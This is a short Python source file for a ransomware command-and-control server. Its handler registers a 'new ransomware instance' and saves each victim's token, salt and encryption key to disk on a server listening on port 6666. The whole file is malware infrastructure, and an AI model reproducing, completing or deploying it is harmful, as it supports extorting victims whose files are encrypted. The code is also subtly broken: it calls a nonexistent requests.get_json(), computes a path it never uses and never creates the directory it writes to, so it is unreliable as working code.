import base64
from hashlib import sha256
from http.server import HTTPServer
import os
import requests

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        path = os.path.join(CNC.ROOT_PATH, params["token"])
        token = params["token"]
        salt = params["salt"]
        key = params["key"]
        self.save_b64(token, salt, "salt.bin")
        self.save_b64(token, key, "key.bin")
        # the body contain the payload send by the victim
        body = requests.get_json()
        return {"status": "ok"}
       

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()